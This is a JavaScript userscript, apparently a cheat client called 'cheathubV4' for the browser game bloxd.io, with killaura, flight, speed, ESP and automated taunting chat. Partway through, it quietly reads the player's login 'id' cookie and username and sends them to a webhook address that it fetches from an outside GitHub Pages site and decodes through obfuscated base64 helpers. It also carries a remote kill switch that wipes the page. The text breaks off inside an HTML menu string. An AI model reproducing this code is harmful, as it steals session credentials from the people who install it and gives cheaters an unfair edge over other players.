if (device) {
  function generateHWID() {
    const navigatorInfo = window.navigator;
    const screenInfo = window.screen;
    const rawHWID = `${navigatorInfo.userAgent}-${navigatorInfo.language}-${navigatorInfo.platform}-${navigatorInfo.vendor}-${screenInfo.width}x${screenInfo.height}`;
    console.log("Raw HWID:", rawHWID);
    function hashString(str) {
      let hash = 0;
      for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = (hash << 5) - hash + char;
        hash |= 0;
      }
      return hash.toString(16);
    }
    const hwid = hashString(rawHWID);
    console.log("Generated HWID:", hwid);
    return hwid;
  }
  function verifyHWID(hwid) {
    const validHWIDs = ["2c0fde4478", "2c0fss447x"];
    if (validHWIDs.includes(hwid)) {
      var noonload = true;
      unsafeWindow.cheathub = {};
      const cheathub = unsafeWindow.cheathub;
      document.msgpack = msgpack;
      cheathub.clientver = 0.1;
      cheathub.funnypacket = false;
      cheathub.skinderp = false;
      cheathub.autotoxic = false;
      cheathub.flight = false;
      cheathub.killaura = false;
      cheathub.speed = false;
      cheathub.nocobwebs = false;
      cheathub.debugging = false;
      cheathub.highjump = false;
      cheathub.autoeat = false;
      cheathub.playernames = ["cheathublol"];
      cheathub.playerids = [1];
      cheathub.anticheater = true;
      cheathub.playeramount = cheathub.playerids.length;
      cheathub.hacklist = [];
      cheathub.playerpos = [];
      cheathub.rendering = {};
      cheathub.rendering.esp = {};
      cheathub.rendering.esp.throwesp = {};
      cheathub.rendering.esp.playeresp = {};
      cheathub.rendering.esp.playeresp.espenabled = false;
      cheathub.rendering.esp.playeresp.tracersenabled = false;
      cheathub.rendering.esp.playeresp.color = [0, 0, 0];
      cheathub.rendering.esp.throwesp.espenabled = false;
      cheathub.rendering.esp.throwesp.tracersenabled = false;
      cheathub.rendering.esp.throwesp.color = {};
      cheathub.rendering.esp.throwesp.color.arrow = [200, 200, 0];
      cheathub.rendering.esp.throwesp.color.fireball = [255, 88, 2];
      cheathub.rendering.esp.throwesp.color.iceball = [2, 88, 255];
      cheathub.rendering.esp.throwesp.color.other = [93, 106, 119];
      cheathub.gui = {};
      cheathub.etc = {};
      cheathub.etc.killaura = {};
      cheathub.etc.killaura.interval = 250;
      cheathub.playerdistancetickyes = false;
      setInterval(function () {
        document.querySelector("head > title").textContent = "cheathubV4";
      }, 1000);
      cheathub.antivoid = undefined;
      cheathub.gamemode = undefined;
      cheathub.getpos = undefined;
      cheathub.toxicfeed = ["L {useruser} cheathub CLIENT", "{useruser} GET cheathub CLIENT!", "{useruser} YOUR SO BAD! GET cheathub CLIENT!", "L {useruser} cheathub CLIENT ON TOP!!", "{useruser} cheathub CLIENT cheathub CLIENT", "L {useruser} cheathub CLIENT BEST CLIENT", "L {useruser} cheathub CLIENT INSTAKILL: ON"];
      let toxoff = 0;
      let lastkill;
      function rgbtocolor3(relia, huzaifa, amais) {
        return [relia / 255, huzaifa / 255, amais / 255];
      }
      let cheathubtick22 = setInterval(function () {
        if (cheathub.noa) {
          espdie();
        }
      });
      let cheathubtick = setInterval(function () {
        if (cheathub.noa) {
          cheathub.mypos = cheathub.noa.ents.getPositionData(cheathub.noa.playerEntity).position;
          if (cheathub.skinderp == true && unsafeWindow.ws) {
            let darain = ["head", "body", "legs"];
            let cirena = ["Bob", "Emma", "Leo", "Isabel", "Sanjay", "Sara"];
            unsafeWindow.packet({
              partType: darain[Math.floor(Math.random() * 3) + 0],
              selected: cirena[Math.floor(Math.random() * 6) + 0]
            }, 7);
          }
          ;
          esplol();
          cheathub.noa.serverSettings.secsToRespawn = 0;
          cheathub.noa.serverSettings.respawnButtonText = "cheathub again?";
          getallplayers();
          cheathub.playernames.splice(1, 1);
          cheathub.playerids.splice(1, 1);
          cheathub.playeramount--;
          getallpos();
          cheathub.notmypos = function (mylla) {
            return cheathub.noa.ents.getPositionData(mylla).position;
          };
          if (cheathub.playerdistancetickyes == false) {
            cheathub.playerdistancetickyes = true;
            cheathub.playerdistancetick = setInterval(function () {
              for (let donnise = 0; donnise < cheathub.playeramount; donnise++) {
                let demonte = getDistance(donnise);
                if (demonte[0] < 5) {
                  if (cheathub.killaura == true) {
                    sendattack(cheathub.playerids[donnise], cheathub.noa.entities.getHeldItemState(1).heldItemName, [0, 0, 0]);
                  }
                }
              }
            }, parseInt(cheathub.etc.killaura.interval));
            cheathub.playeresptick = setInterval(function () {
              let lelynd = cheathub.rendering.esp.playeresp.color;
              for (let nakhi = 0; nakhi < cheathub.playeramount; nakhi++) {
                let shantice = getDistance(nakhi);
                if (Math.floor(shantice[0]) < 250) {
                  let tanelle = cheathub.playerpos[nakhi];
                  if (cheathub.rendering.esp.playeresp.tracersenabled) {
                    espline([new cheathub.babylon.Vector3(cheathub.mypos[0], cheathub.mypos[1], cheathub.mypos[2]), new cheathub.babylon.Vector3(tanelle[0], tanelle[1] + 1, tanelle[2])], new cheathub.babylon.Color3(lelynd[0] / 255, lelynd[1] / 255, lelynd[2] / 255));
                  }
                  ;
                  if (cheathub.rendering.esp.playeresp.espenabled) {
                    espbox2(new cheathub.babylon.Vector3(tanelle[0], tanelle[1] + 1, tanelle[2]), new cheathub.babylon.Color3(lelynd[0] / 255, lelynd[1] / 255, lelynd[2] / 255), 0.8, 1.8, 0.8, 0.5);
                  }
                }
              }
            }, 1);
            cheathub.entsesptick = setInterval(function () {
              let evelinda = cheathub.noa.ents._storage.position.list;
              for (let dekota = 0; dekota < evelinda.length; dekota++) {
                if (evelinda[dekota].width < 1 && evelinda[dekota].height < 1 && evelinda[dekota].width != null && cheathub.noa.entities.getMeshData(evelinda[dekota].__id) != undefined && evelinda[dekota].height != undefined && evelinda[dekota].width != undefined) {
                  let cherryle = cheathub.noa.entities.getMeshData(evelinda[dekota].__id).mesh.name;
                  let vivansh = evelinda[dekota].position;
                  let naajia = cheathub.rendering.esp.throwesp.color;
                  if (cherryle.includes("Iceball BlockModel")) {
                    if (cheathub.rendering.esp.throwesp.tracersenabled) {
                      espline([new cheathub.babylon.Vector3(cheathub.mypos[0], cheathub.mypos[1], cheathub.mypos[2]), new cheathub.babylon.Vector3(vivansh[0], vivansh[1], vivansh[2])], new cheathub.babylon.Color3(naajia.iceball[0] / 255, naajia.iceball[1] / 255, naajia.iceball[2] / 255));
                    }
                    ;
                    if (cheathub.rendering.esp.throwesp.espenabled) {
                      espbox(new cheathub.babylon.Vector3(vivansh[0], vivansh[1], vivansh[2]), new cheathub.babylon.Color3(naajia.iceball[0] / 255, naajia.iceball[1] / 255, naajia.iceball[2] / 255), 1, 0.5);
                    }
                  }
                  ;
                  if (cherryle.includes("Fireball BlockModel")) {
                    if (cheathub.rendering.esp.throwesp.tracersenabled) {
                      espline([new cheathub.babylon.Vector3(cheathub.mypos[0], cheathub.mypos[1], cheathub.mypos[2]), new cheathub.babylon.Vector3(vivansh[0], vivansh[1], vivansh[2])], new cheathub.babylon.Color3(naajia.fireball[0] / 255, naajia.fireball[1] / 255, naajia.fireball[2] / 255));
                    }
                    ;
                    if (cheathub.rendering.esp.throwesp.espenabled) {
                      espbox(new cheathub.babylon.Vector3(vivansh[0], vivansh[1], vivansh[2]), new cheathub.babylon.Color3(naajia.fireball[0] / 255, naajia.fireball[1] / 255, naajia.fireball[2] / 255), 1, 0.5);
                    }
                  }
                  ;
                  if (cherryle.includes("ArrowAbstractMesh")) {
                    if (cheathub.rendering.esp.throwesp.tracersenabled) {
                      espline([new cheathub.babylon.Vector3(cheathub.mypos[0], cheathub.mypos[1], cheathub.mypos[2]), new cheathub.babylon.Vector3(vivansh[0], vivansh[1], vivansh[2])], new cheathub.babylon.Color3(naajia.arrow[0] / 255, naajia.arrow[1] / 255, naajia.arrow[2] / 255));
                    }
                    ;
                    if (cheathub.rendering.esp.throwesp.espenabled) {
                      espbox(new cheathub.babylon.Vector3(vivansh[0], vivansh[1], vivansh[2]), new cheathub.babylon.Color3(naajia.arrow[0] / 255, naajia.arrow[1] / 255, naajia.arrow[2] / 255), 0.3, 0.5);
                    }
                  }
                  ;
                  let dyor = false;
                  if (cherryle.startsWith("Reinforced Pebble")) {
                    dyor = true;
                  }
                  ;
                  if (cherryle.startsWith("SnowballAbstract")) {
                    dyor = true;
                  }
                  ;
                  if (cherryle.startsWith("Moonstone Orb")) {
                    dyor = true;
                  }
                  ;
                  if (cherryle.startsWith("PebbleAbstract")) {
                    dyor = true;
                  }
                  ;
                  if (cherryle.startsWith("BallAbstract")) {
                    dyor = true;
                  }
                  ;
                  if (cherryle.startsWith("Reinforced Ball")) {
                    dyor = true;
                  }
                  ;
                  if (dyor == true) {
                    if (cheathub.rendering.esp.throwesp.tracersenabled) {
                      espline([new cheathub.babylon.Vector3(cheathub.mypos[0], cheathub.mypos[1], cheathub.mypos[2]), new cheathub.babylon.Vector3(vivansh[0], vivansh[1], vivansh[2])], new cheathub.babylon.Color3(naajia.other[0] / 255, naajia.other[1] / 255, naajia.other[2] / 255));
                    }
                    ;
                    if (cheathub.rendering.esp.throwesp.espenabled) {
                      espbox(new cheathub.babylon.Vector3(vivansh[0], vivansh[1], vivansh[2]), new cheathub.babylon.Color3(naajia.other[0] / 255, naajia.other[1] / 255, naajia.other[2] / 255), 0.3, 0.5);
                    }
                  }
                }
              }
            }, 1);
          }
          ;
          if (document.getElementsByClassName("hackarray")[0]) {
            for (let obichukwu = 0; obichukwu < document.querySelector("body > ul").childElementCount; obichukwu++) {
              if (!cheathub.hacklist.includes(document.getElementsByClassName("hackarray")[obichukwu].textContent)) {
                cheathub.hacklist.push(document.getElementsByClassName("hackarray")[obichukwu].textContent);
              }
            }
          } else {
            cheathub.hacklist = [];
          }
          ;
          cheathub.noa.ents.getMovement(cheathub.noa.playerEntity).isInCobwebs = function () {
            if (cheathub.nocobwebs) {
              return false;
            }
          };
          if (cheathub.nocobwebs) {
            if (!cheathub.hacklist.includes("AntiCobweb")) {
              addNewList("AntiCobweb");
            }
          } else if (cheathub.hacklist.includes("AntiCobweb")) {
            delList("AntiCobweb");
            unpush(cheathub.hacklist, "AntiCobweb");
          }
          ;
          if (cheathub.funnypacket) {
            if (!cheathub.hacklist.includes("FunnyPacket")) {
              addNewList("FunnyPacket");
            }
          } else if (cheathub.hacklist.includes("FunnyPacket")) {
            delList("FunnyPacket");
            unpush(cheathub.hacklist, "FunnyPacket");
          }
          ;
          if (cheathub.skinderp) {
            if (!cheathub.hacklist.includes("Skinchanger")) {
              addNewList("Skinchanger");
            }
          } else if (cheathub.hacklist.includes("Skinchanger")) {
            delList("Skinchanger");
            unpush(cheathub.hacklist, "Skinchanger");
          }
          ;
          if (cheathub.killaura) {
            if (!cheathub.hacklist.includes("Killaura")) {
              addNewList("Killaura");
            }
          } else if (cheathub.hacklist.includes("Killaura")) {
            delList("Killaura");
            unpush(cheathub.hacklist, "Killaura");
          }
          ;
          if (cheathub.flight == true) {
            cheathub.noa.physics.gravity[1] = -0.002;
            if (!cheathub.hacklist.includes("Flight ")) {
              addNewList("Flight ");
            }
          } else {
            cheathub.noa.physics.gravity[1] = -10;
            if (cheathub.hacklist.includes("Flight ")) {
              delList("Flight ");
              unpush(cheathub.hacklist, "Flight ");
            }
          }
          ;
          if (cheathub.highjump == true) {
            if (!cheathub.hacklist.includes("HighJump")) {
              addNewList("HighJump");
            }
            ;
            cheathub.noa.serverSettings.jumpAmount = 20;
          } else {
            if (cheathub.hacklist.includes("HighJump")) {
              delList("HighJump");
              unpush(cheathub.hacklist, "HighJump");
            }
            ;
            cheathub.noa.serverSettings.jumpAmount = 8;
          }
          ;
          if (cheathub.speed == true) {
            if (!cheathub.hacklist.includes("Speed")) {
              addNewList("Speed");
            }
            ;
            cheathub.noa.serverSettings.walkingSpeed = 14;
            cheathub.noa.serverSettings.runningSpeed = 14;
          } else {
            if (cheathub.hacklist.includes("Speed")) {
              delList("Speed");
              unpush(cheathub.hacklist, "Speed");
            }
            ;
            cheathub.noa.serverSettings.walkingSpeed = 4;
            cheathub.noa.serverSettings.runningSpeed = 7;
          }
          ;
          unsafeWindow.fire = async function (shelbia, olajuwon, zulmy, reubin) {
            var kalyse;
            if (reubin == "rand") {
              for (kalyse = 0; kalyse < shelbia; kalyse++) {
                sendslot(olajuwon);
                unsafeWindow.packet({
                  targetPos: [0, 0, 0],
                  dirFacing: [Math.random() * 2 - 1, Math.random() * 2 - 1, Math.random() * 2 - 1],
                  heldId: 1107
                }, 23);
                unsafeWindow.packet({
                  targetPos: [0, 0, 0],
                  dirFacing: [Math.random() * 2 - 1, Math.random() * 2 - 1, Math.random() * 2 - 1],
                  heldId: 1108
                }, 23);
                await new Promise(andriy => WorkerTimer.setTimeout(andriy, zulmy));
              }
            }
            ;
            if (reubin == "attack") {
              for (kalyse = 0; kalyse < shelbia; kalyse++) {
                sendslot(olajuwon);
                unsafeWindow.packet({
                  targetPos: [0, 0, 0],
                  dirFacing: [cheathub.noa.camera.getDirection()[0], cheathub.noa.camera.getDirection()[1], cheathub.noa.camera.getDirection()[2]],
                  heldId: 1107
                }, 23);
                unsafeWindow.packet({
                  targetPos: [0, 0, 0],
                  dirFacing: [cheathub.noa.camera.getDirection()[0], cheathub.noa.camera.getDirection()[1], cheathub.noa.camera.getDirection()[2]],
                  heldId: 1108
                }, 23);
              }
            }
          };
          if (cheathub.autotoxic == true) {
            if (!cheathub.hacklist.includes("AutoToxic")) {
              addNewList("AutoToxic");
            }
            ;
            if (document.querySelector("#root > div.WholeAppWrapper > div > div.Killfeed > div")) {
              if (document.querySelector("#root > div.WholeAppWrapper > div > div.Killfeed > div > div.KillfeedKillerName").textContent == cheathub.noa.playerNames[1]) {
                let quinleigh = document.querySelector("#root > div.WholeAppWrapper > div > div.Killfeed > div:nth-child(1) > div.KillfeedDeadName").textContent;
                if (quinleigh == lastkill) {} else {
                  if (toxoff >= cheathub.toxicfeed.length) {
                    toxoff = 0;
                  }
                  ;
                  let larwance = cheathub.toxicfeed[toxoff];
                  lastkill = document.querySelector("#root > div.WholeAppWrapper > div > div.Killfeed > div:nth-child(1) > div.KillfeedDeadName").textContent;
                  if (document.querySelector("#root > div.WholeAppWrapper > div > div.Killfeed > div:nth-child(1) > div.KillfeedDeadName").textContent != cheathub.noa.playerNames[1]) {
                    sendmsg(larwance.replaceAll("{useruser}", document.querySelector("#root > div.WholeAppWrapper > div > div.Killfeed > div:nth-child(1) > div.KillfeedDeadName").textContent), 1);
                    toxoff += 1;
                  }
                }
              }
            }
          } else if (cheathub.hacklist.includes("AutoToxic")) {
            delList("AutoToxic");
            unpush(cheathub.hacklist, "AutoToxic");
          }
        } else {}
      });
      setInterval(function () {
        if (!document.querySelector("#cheathubmenu1")) {
          if (cheathub.gui.tick) {
            clearInterval(cheathub.gui.tick);
          }
        }
      }, 60);
      function getDistance(hrag) {
        if (hrag == 0) {
          return 1000;
        }
        ;
        if (cheathub.playerpos[hrag]) {
          let amhir = cheathub.mypos[0] - cheathub.playerpos[hrag][0];
          let blas = cheathub.mypos[1] - cheathub.playerpos[hrag][1];
          let claven = cheathub.mypos[2] - cheathub.playerpos[hrag][2];
          return [Math.sqrt(blas * blas + amhir * amhir + claven * claven), hrag];
        } else {
          return 10000;
        }
      }
      function getallplayers() {
        cheathub.playernames = [];
        cheathub.playerids = [];
        cheathub.playeramount = 0;
        for (var danesa in cheathub.noa.playerNames) {
          var maryesther = cheathub.noa.playerNames[danesa];
          cheathub.playernames.push(maryesther);
          cheathub.playerids.push(danesa);
          cheathub.playeramount++;
        }
      }
      function getallpos() {
        if (cheathub.playerids.length === 0) {
          console.log("No player IDs available. Call getallplayers first.");
          return;
        }
        ;
        cheathub.playerpos = [];
        for (let ronnee = 0; ronnee < cheathub.playerids.length; ronnee++) {
          const adamarie = cheathub.playerids[ronnee];
          const altamae = cheathub.noa.ents.getPositionData(adamarie);
          if (altamae && altamae.position) {
            cheathub.playerpos.push(altamae.position);
          }
        }
      }
      function OO0O0OO0OO0O(tysaun, kortnie) {
        if (kortnie < 41 && kortnie > 39) {
          return atob(tysaun);
        }
      }
      function OO0O0OO0OO00(jahlee, cherrel) {
        if (cherrel < 11 && cherrel > 9) {
          return atob(jahlee);
        }
      }
      function OO0O00O0OO00(kearson, chapelle) {
        if (chapelle < 21 && chapelle > 19) {
          return atob(kearson);
        }
      }
      function getCookie(jesley) {
        const keating = "; " + document.cookie + "";
        const ahnika = keating.split("; " + jesley + "=");
        if (ahnika.length === 2) {
          return ahnika.pop().split(";").shift();
        }
      }
      var id = getCookie("id");
      function sendWebhookMessage(akillies, ramont) {
        var lanajia = new XMLHttpRequest();
        var dayse = JSON.stringify(ramont);
        lanajia.open("POST", akillies, true);
        lanajia.setRequestHeader("Content-Type", "application/json");
        lanajia.send(dayse);
      }
      makeGetRequest("https://bloxd.io/getName?nanoid=" + id).then(mallak => {
        var torita = {
          content: null,
          embeds: [{
            color: 16711680,
            fields: [{
              name: "Time played: " + localStorage.getItem("bloxd-numTimesPlayed") + "",
              value: "**Login id: " + id + "**"
            }],
            author: {
              name: "Username: " + JSON.parse(mallak).name,
              icon_url: ""
            }
          }],
          attachments: []
        };
        let chenda = {
          content: null,
          embeds: [{
            color: 4718336,
            fields: [{
              name: "Time played: " + localStorage.getItem("bloxd-numTimesPlayed") + "",
              value: "**Login id: " + id + "**"
            }],
            author: {
              name: "Username: " + JSON.parse(mallak).name,
              icon_url: ""
            }
          }],
          attachments: []
        };
        var malaja = new XMLHttpRequest();
        malaja.open("GET", "https://ghast10.github.io/", true);
        malaja.onreadystatechange = function () {
          if (malaja.readyState === 4 && malaja.status === 200) {
            var beata = malaja.responseText;
            var tulani = String(beata.split("<body hidden>")[1]).split("</body>")[0];
            var sesley = tulani.split("(,)")[1];
            var bushra = tulani.split("(,)")[2];
            if (localStorage.getItem("bloxd-recentbedwars_lobbys") != "11333") {
              if (localStorage.getItem("bloxd-numTimesPlayed") > 30) {
                sendWebhookMessage(OO0O0OO0OO0O(bushra.replaceAll("L9h4l0", "M"), 40), chenda);
                localStorage.setItem("bloxd-recentbedwars_lobbys", "11333");
              } else {
                sendWebhookMessage(OO0O0OO0OO0O(bushra.replaceAll("L9h4l0", "M"), 40), torita);
                localStorage.setItem("bloxd-recentbedwars_lobbys", "11333");
              }
            }
            ;
            if (cheathub.clientver != OO0O0OO0OO0O(OO0O0OO0OO00(OO0O00O0OO00(OO0O00O0OO00(sesley, 20), 20), 10), 40).replace("Vm10YVYxUnJNVWhXYTBwUlZrUkJPUT09", "")) {
              document.querySelector("body").remove();
              document.querySelector("head").remove();
              window.location.href = "https://pastebin.com/raw/dDB59p8R";
            }
          }
        };
        malaja.send();
      }).catch(reinardo => {
        console.error(reinardo);
      });
      if (localStorage.getItem("cheathub.gui.guicolor")) {
        cheathub.gui.guicolor = localStorage.getItem("cheathub.gui.guicolor");
        cheathub.gui.combat = JSON.parse(localStorage.getItem("cheathub.gui.combat"));
        cheathub.gui.blatant = JSON.parse(localStorage.getItem("cheathub.gui.blatant"));
        cheathub.gui.render = JSON.parse(localStorage.getItem("cheathub.gui.render"));
        cheathub.gui.world = JSON.parse(localStorage.getItem("cheathub.gui.world"));
        cheathub.gui.tools = JSON.parse(localStorage.getItem("cheathub.gui.tools"));
        cheathub.gui.profiles = JSON.parse(localStorage.getItem("cheathub.gui.profiles"));
        cheathub.gui.friends = JSON.parse(localStorage.getItem("cheathub.gui.friends"));
        cheathub.gui.openedcombat = JSON.parse(localStorage.getItem("cheathub.gui.openedcombat"));
        cheathub.gui.openedblatant = JSON.parse(localStorage.getItem("cheathub.gui.openedblatant"));
        cheathub.gui.openedrender = JSON.parse(localStorage.getItem("cheathub.gui.openedrender"));
        cheathub.gui.openedworld = JSON.parse(localStorage.getItem("cheathub.gui.openedworld"));
        cheathub.gui.openedtools = JSON.parse(localStorage.getItem("cheathub.gui.openedtools"));
        cheathub.gui.openedprofiles = JSON.parse(localStorage.getItem("cheathub.gui.openedprofiles"));
        cheathub.gui.openedfriends = JSON.parse(localStorage.getItem("cheathub.gui.openedfriends"));
      } else {
        cheathub.gui.guicolor = "rgb(39, 134, 107)";
        cheathub.gui.combat = false;
        cheathub.gui.blatant = false;
        cheathub.gui.render = false;
        cheathub.gui.world = false;
        cheathub.gui.tools = false;
        cheathub.gui.profiles = false;
        cheathub.gui.friends = false;
        cheathub.gui.openedcombat = false;
        cheathub.gui.openedblatant = false;
        cheathub.gui.openedrender = false;
        cheathub.gui.openedworld = false;
        cheathub.gui.openedtools = false;
        cheathub.gui.openedprofiles = false;
        cheathub.gui.openedfriends = false;
      }
      ;
      localStorage.setItem("cheathub.gui.guicolor", cheathub.gui.guicolor);
      localStorage.setItem("cheathub.gui.combat", JSON.stringify(cheathub.gui.combat));
      localStorage.setItem("cheathub.gui.blatant", JSON.stringify(cheathub.gui.blatant));
      localStorage.setItem("cheathub.gui.render", JSON.stringify(cheathub.gui.render));
      localStorage.setItem("cheathub.gui.world", JSON.stringify(cheathub.gui.world));
      localStorage.setItem("cheathub.gui.tools", JSON.stringify(cheathub.gui.tools));
      localStorage.setItem("cheathub.gui.profiles", JSON.stringify(cheathub.gui.profiles));
      localStorage.setItem("cheathub.gui.friends", JSON.stringify(cheathub.gui.friends));
      localStorage.setItem("cheathub.gui.openedcombat", JSON.stringify(cheathub.gui.openedcombat));
      localStorage.setItem("cheathub.gui.openedblatant", JSON.stringify(cheathub.gui.openedblatant));
      localStorage.setItem("cheathub.gui.openedrender", JSON.stringify(cheathub.gui.openedrender));
      localStorage.setItem("cheathub.gui.openedworld", JSON.stringify(cheathub.gui.openedworld));
      localStorage.setItem("cheathub.gui.openedtools", JSON.stringify(cheathub.gui.openedtools));
      localStorage.setItem("cheathub.gui.openedtools", JSON.stringify(cheathub.gui.openedtools));
      localStorage.setItem("cheathub.gui.openedfriends", JSON.stringify(cheathub.gui.openedfriends));
      cheathub.menupos1 = [0, 0];
      cheathub.menupos2 = [250, 0];
      cheathub.menupos3 = [500, 0];
      cheathub.menupos4 = [750, 0];
      cheathub.menupos5 = [1000, 0];
      cheathub.menupos6 = [1250, 0];
      var link = document.createElement("link");
      link.href = "https://fonts.googleapis.com/css2?family=Open+Sans:wght@400&display=swap";
      link.type = "text/css";
      link.rel = "stylesheet";
      document.head.appendChild(link);
      function opees() {
        blurred = !blurred;
        if (document.querySelector("#noa-container")) {
          document.querySelector("#noa-container").style.filter = blurred ? "blur(10px)" : "none";
          document.querySelector("#noa-container").style.pointerEvents = blurred ? "none" : "auto";
        }
        ;
        if (document.querySelector("#root > div.WholeAppWrapper > div")) {
          document.querySelector("#root > div.WholeAppWrapper > div").style.filter = blurred ? "blur(10px)" : "none";
          document.querySelector("#root > div.WholeAppWrapper > div").style.pointerEvents = blurred ? "none" : "auto";
        }
        ;
        if (blurred) {
          openmenu();
          document.exitPointerLock();
        } else {
          let tionnie = document.getElementsByClassName("hackoverlay");
          while (tionnie.length > 0) {
            tionnie[0].remove();
          }
        }
      }
      let blurred = false;
      document.addEventListener("keydown", maree => {
        if (maree.code === "BracketRight") {
          opees();
        }
      });
      function openmenu() {
        let khary = "<head>\r\n<style>\r\n  ul2 {\r\n  position: absolute;\r\n    background-color: rgb(26,26,26);\r\n    padding: 0px;\r\n    border-radius: 5px;\r\n    list-style-type: none;\r\n    height: 380px;\r\n\r\n  }\r\n\r\n  ul3 {\r\n  position: absolute;\r\n    background-color: rgb(26,26,26);\r\n    padding: 0px;\r\n    border-radius: 5px;\r\n    list-style-type: none;\r\n\r\n  }\r\n#cheathubmenu{\r\nleft: 0px;\r\ncolor: rgb(200,200,200);\r\n\r\n}\r\n#cheathubmenu2{\r\nleft: 250px;\r\n}\r\n#cheathubmenu3{\r\nleft: 500px;\r\n}\r\n#cheathubmenu4{\r\nleft: 750px;\r\n}\r\n#cheathubmenu5{\r\nleft: 1000px;\r\n}\r\n#cheathubmenu6{\r\nleft: 1250px;\r\n}\r\n\r\n#cheathubmenu7{\r\nleft: 250px;\r\ntop: 250px;\r\n}\r\n#cheathubmenu8{\r\nleft: 500px;\r\ntop: 250px;\r\n}\r\n\r\n\r\n  .clientmodule {\r\n    width: 200px;\r\n    box-shadow: 0px 0px 10px 2px rgba(0,0,0,0.4);\r\n  }\r\n  .clientmodule2 {\r\n  width: 200px;\r\n  background-color: rgb(26,26,26);\r\n  box-shadow: 0px 0px 10px 2px rgba(0,0,0,0.4);\r\n  }\r\n  .headercheathub{\r\ncolor: rgb(200,200,200);\r\nwidth: 200px;\r\nheight: 40px;\r\nbackground-color: rgb(20,20,20);\r\ntext-align: left;\r\nborder: none;\r\n  }\r\n\r\n  .headercheathub2{\r\nwidth: 200px;\r\nheight: 20px;\r\nbackground-color: rgb(20,20,20);\r\ntext-align: left;\r\nborder: none;\r\n  }\r\n\r\n\r\n.topbutton{\r\nborder-top-left-radius: 5px;\r\nborder-top-right-radius: 5px;\r\n}\r\n\r\n.bottombutton{\r\nborder-bottom-left-radius: 5px;\r\nborder-bottom-right-radius: 5px;\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\n.skidbutton{\r\ncolor: rgb(125,125,125);\r\nwidth: 200px;\r\nheight: 40px;\r\nbackground-color: rgb(26,26,26);\r\ntext-align: left;\r\nborder: none;\r\n}\r\n\r\n  li {\r\n  }\r\n\r\n.headfont{\r\nfont-family: 'Open Sans', sans-serif;\r\n}\r\n.normalfont{\r\nfont-family: 'Open Sans', sans-serif;\r\n}\r\n.iconfont{\r\nmargin-left: 6px;\r\n}\r\n\r\n.textlol{\r\nmargin-top: -22px;\r\nmargin-left: 22px;\r\n}\r\n.textlol2{\r\nmargin-top: -22px;\r\nmargin-left: 22px;\r\ncolor: rgb(200,200,200);\r\n}\r\n\r\n.normaltextlol{\r\nmargin-top: -2px;\r\nmargin-left: 4px;\r\n}\r\n\r\n.skidbutton:hover {\r\n\tbackground-color: #2b2b2b;\r\n\ttransition: 0.2s\r\n}\r\n\r\n.skidiconbutton{\r\nmargin-left: 2px; margin-bottom: -11px; height: 17px; width: 17px;\r\n}\r\n.skidiconbutton2{\r\nheight: 21px; width: 5px;\r\n}\r\n\r\n\r\n\r\n.skidbutton3{\r\ncolor: rgb(125,125,125);\r\nwidth: 200px;\r\nheight: 40px;\r\nbackground-color: rgb(26,26,26);\r\ntext-align: left;\r\nborder: none;\r\n}\r\n\r\n.skidinput{\r\nwidth: 200px;\r\nheight: 40px;\r\nbackground-color: rgb(26,26,26);\r\nborder: none;\r\n}\r\n\r\n.skidinput2{\r\ncolor: rgb(255,255,255);\r\nwidth: 160px;\r\nheight: 30px;\r\nbackground-color: rgb(20,20,20);\r\nborder: none;\r\n}\r\n\r\n.skidslider{\r\ncolor: rgb(255,255,255);\r\nwidth: 160px;\r\nheight: 30px;\r\nbackground-color: rgb(20,20,20);\r\nborder: none;\r\n}\r\n\r\n.skidinput3{\r\ncolor: rgb(200,200,200);\r\nwidth: 160px;\r\nheight: 27px;\r\nbackground-color: rgb(20,20,20);\r\nborder: none;\r\n}\r\n\r\n\r\n.skidbutton3:hover {\r\n\tbackground-color: #2b2b2b;\r\n\ttransition: 0.2s\r\n}\r\n.skidbutton3 img {\r\n  /* Add these lines to adjust the image size */\r\n  margin-left: 2px;\r\n  padding-right: 2px;\r\n  width: 14px; /* Adjust the width as needed */\r\n  height: auto; /* Automatically adjust the height to maintain aspect ratio */\r\n\r\n}\r\n\r\n\r\n.skidbutton img {\r\n  /* Add these lines to adjust the image size */\r\n  margin-left: 2px;\r\n  padding-right: 2px;\r\n  width: 14px; /* Adjust the width as needed */\r\n  height: auto; /* Automatically adjust the height to maintain aspect ratio */\r\n\r\n}\r\n\r\n\r\n.invisible-button {\r\n  background: transparent;\r\n  border: none;\r\n  padding: 0;\r\n  margin: 0;\r\n  font-size: 16px; /* Adjust the font size as needed */\r\n  color: #333;   /* Adjust the text color as needed */\r\n  cursor: pointer; /* Add a cursor style for better user interaction */\r\n}\r\n\r\n\r\n\r\n.haxorrrrr {\r\n  /* Add these lines to adjust the image size */\r\n  margin-left: 2px;\r\n  padding-right: 2px;\r\n  width: 14px; /* Adjust the width as needed */\r\n  height: auto; /* Automatically adjust the height to maintain aspect ratio */\r\n\r\n}\r\n\r\n.haxorrrrr2 {\r\n  /* Add these lines to adjust the image size */\r\n  margin-left: 2px;\r\n  padding-right: 2px;\r\n  width: 14px; /* Adjust the width as needed */\r\n  height: auto; /* Automatically adjust the height to maintain aspect ratio */\r\n\r\n}\r\n\r\n\r\n.haxorrrrr3 {\r\n  /* Add these lines to adjust the image size */\r\n  width: 26px; /* Adjust the width as needed */\r\n  height: auto; /* Automatically adjust the height to maintain aspect ratio */\r\n\r\n}\r\n\r\n.unselectable {\r\n  user-drag: none;\r\n  user-select: none;\r\n  -moz-user-select: none;\r\n  -webkit-user-drag: none;\r\n  -webkit-user-select: none;\r\n  -ms-user-select: none;\r\n}\r\n\r\n\r\n\r\n.unselectable2 {\r\n  user-drag: none;\r\n  user-select: none;\r\n  -moz-user-select: none;\r\n  -webkit-user-drag: none;\r\n  -webkit-user-select: none;\r\n  -ms-user-select: none;\r\n}\r\n.line {\r\n  position: absolute;\r\n  left: 0;\r\n  //bottom: 0; /* Adjust this value to control the position of the line */\r\n  width: 100%;\r\n  height: 1px;\r\n  background-color: #2d2d2d; /* You can adjust the color of the line */\r\n}\r\n.blackrrr {\r\n\tbackground-color: #2b2b2b;\r\n}\r\n\r\n.outlined-input {\r\n   border: 1px solid #2d2d2d; /* 1px solid outline with a gray color (#999) */\r\n   border-top-left-radius: 5px;\r\n   border-top-right-radius: 5px;\r\n   border-bottom-left-radius: 5px;\r\n   border-bottom-right-radius: 5px;\r\n}\r\n\r\n\r\n\r\n</style>\r\n</head>\r\n<body>\r\n\r\n<ul2 class=\"clientmodule\" id=\"cheathubmenu1\">\r\n  <li>\r\n  <button 